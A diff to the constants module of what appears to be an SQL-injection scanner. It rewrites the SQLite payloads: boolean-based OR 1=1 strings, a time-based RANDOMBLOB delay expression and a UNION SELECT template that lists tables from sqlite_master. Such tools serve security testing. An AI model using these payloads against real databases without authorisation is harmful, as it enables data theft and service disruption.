@@ -1,3 +1,4 @@
+"""Constants: colours, payloads, and SQL templates used by the scanner."""
 BOLD = "\033[1m"
 RED = "\033[0;31m"
 CYAN = "\033[1;36m"
@@ -19,13 +20,13 @@ ERROR_BASED = {
 
 BOOLEAN_BASE = {
     "mysql": ["' AND 1=2 -- -", "' OR 1=1 -- -"],
-    "sqlite": ["')) AND 1=2 -- -", "')) OR 1=1 -- -"],
+    "sqlite": ["' AND 1=2 -- -", "' OR 1=1 -- -"],
 }
 
 TIME_BASED = {
     "mysql": "' AND SLEEP(5) -- -",
     "sqlite": (
-        "')) OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2)))) -- -"
+        "' OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2)))) -- -"
     ),
 }
 
@@ -77,7 +78,7 @@ UNION_BASED = {
         },
     },
     "sqlite": {
-        "select": "')) AND 1=2 UNION SELECT ",
+        "select": "' AND 1=2 UNION SELECT ",
         "tables": {
             "expr": "group_concat('{start}'||name||'{end}') ",
             "from": "sqlite_master WHERE type='table'",
